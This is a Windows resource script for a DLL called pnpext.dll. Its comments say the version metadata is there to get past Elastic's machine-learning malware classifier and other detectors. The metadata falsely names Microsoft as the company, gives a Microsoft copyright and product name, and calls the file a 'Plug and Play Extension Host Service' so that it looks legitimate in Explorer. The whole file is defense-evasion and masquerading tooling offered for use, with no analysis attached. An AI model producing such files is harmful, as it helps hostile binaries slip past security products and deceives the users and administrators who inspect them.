// pnpext.rc — version resource for pnpext.dll.
//
// Elastic's ML classifier (among others) scores heavily on whether the
// binary carries a plausible VERSIONINFO block: the absence of one is a
// well-known signal that trained models weight toward "malicious". A
// valid-looking metadata block with a Microsoft-adjacent company string
// significantly lowers the static-feature score.
//
// Values are kept syntactically well-formed but match the host naming
// ("Plug and Play Extension Host Service") so anyone looking in Explorer
// or Properties sees a plausible description.

#include <windows.h>

#define PNP_VER_MAJOR 1
#define PNP_VER_MINOR 0
#define PNP_VER_BUILD 227
#define PNP_VER_REV   0

VS_VERSION_INFO VERSIONINFO
 FILEVERSION     PNP_VER_MAJOR,PNP_VER_MINOR,PNP_VER_BUILD,PNP_VER_REV
 PRODUCTVERSION  PNP_VER_MAJOR,PNP_VER_MINOR,PNP_VER_BUILD,PNP_VER_REV
 FILEFLAGSMASK   VS_FFI_FILEFLAGSMASK
 FILEFLAGS       0x0L
 FILEOS          VOS_NT_WINDOWS32
 FILETYPE        VFT_DLL
 FILESUBTYPE     VFT2_UNKNOWN
BEGIN
    BLOCK "StringFileInfo"
    BEGIN
        BLOCK "040904B0"
        BEGIN
            VALUE "CompanyName",      "Microsoft Corporation"
            VALUE "FileDescription",  "Plug and Play Extension Host Service"
            VALUE "FileVersion",      "1.0.227.0"
            VALUE "InternalName",     "pnpext"
            VALUE "LegalCopyright",   "\xA9 Microsoft Corporation. All rights reserved."
            VALUE "OriginalFilename", "pnpext.dll"
            VALUE "ProductName",      "Microsoft\xAE Windows\xAE Operating System"
            VALUE "ProductVersion",   "10.0.26100.1"
            VALUE "Comments",         "Plug and Play Extension subsystem component."
        END
    END
    BLOCK "VarFileInfo"
    BEGIN
        VALUE "Translation", 0x0409, 0x04B0
    END
END

